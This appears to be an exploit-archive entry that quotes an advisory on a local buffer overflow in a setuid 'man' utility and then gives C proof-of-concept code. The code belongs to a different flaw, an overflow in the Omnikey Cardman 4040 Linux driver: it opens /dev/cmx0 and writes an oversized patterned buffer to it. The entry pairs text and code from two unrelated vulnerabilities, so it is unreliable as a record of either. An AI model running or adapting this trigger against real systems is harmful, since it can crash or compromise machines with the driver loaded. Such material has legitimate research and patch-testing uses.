source: http://www.securityfocus.com/bid/23355/info

The 'man' command is prone to a local buffer-overflow vulnerability because it fails to properly bounds-check user-supplied input before using it in a memory copy operation.

NOTE: Presumably, this issue is exploitable only when 'man' has been installed setuid.

Exploiting this issue allows attackers to execute malicious machine code with the privileges of the 'man' utility. This can result in the compromise of affected computers. Failed exploit attempts will likely result in denial-of-service conditions. 

PoC Code:
---------
/*
 * Linux Omnikey Cardman 4040 driver buffer overflow (CVE-2007-0005)
 * Copyright (C) Daniel Roethlisberger <daniel.roethlisberger@csnc.ch>
 * Compass Security Network Computing AG, Rapperswil, Switzerland.
 * All rights reserved.
 * http://www.csnc.ch/
 */

#include<sys/stat.h>
#include<fcntl.h>
#include<unistd.h>
#include<stdlib.h>
#include<stdio.h>
#include<string.h>
#include<errno.h>

int main(int argc, char *argv[]) {
    int fd, i, n;
    char buf[8192];

    /*
     * 0  1  2  3  4  5  6  7  8  9  a  b  c  d  e  f  ...
     * 00 01 00 02 00 03 00 04 00 05 00 06 00 07 00 08 ...
     */
    for (i = 0; i < sizeof(buf); i += 2) {
        buf[i]   = (char)(((i/2) & 0xFF00) >> 8);
        buf[i+1] = (char) ((i/2) & 0x00FF);
    }

    if ((fd = open("/dev/cmx0", O_RDWR)) < 0) {
        printf("Error: open() => %s\n", strerror(errno));
        exit(errno);
    }
    if ((n = write(fd, buf, sizeof(buf))) < 0) {
        printf("Error: write() => %s\n", strerror(errno));
        exit(errno);
    }
    printf("%d of %d bytes written\n", n, sizeof(buf));
    exit(0);
}


